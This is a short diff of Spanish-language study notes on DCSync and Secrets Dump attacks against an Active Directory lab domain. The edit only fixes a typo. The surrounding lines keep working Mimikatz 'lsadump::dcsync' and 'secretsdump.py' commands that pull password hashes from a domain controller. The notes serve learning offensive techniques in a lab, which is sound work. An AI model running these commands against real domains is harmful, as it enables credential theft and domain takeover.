@@ -12,6 +12,6 @@
 - `lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator`
 
 ## Secrets Dump
-- La hereramienita envía una solicitud al DC para replicar los objetos del dominio y así extraer hashes.
+- La herramienta envía una solicitud al DC para replicar los objetos del dominio y así extraer hashes.
 - `secretsdump.py <dominio>/<usuario>:<contraseña>@<IP_del_DC>`
 - `secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5`
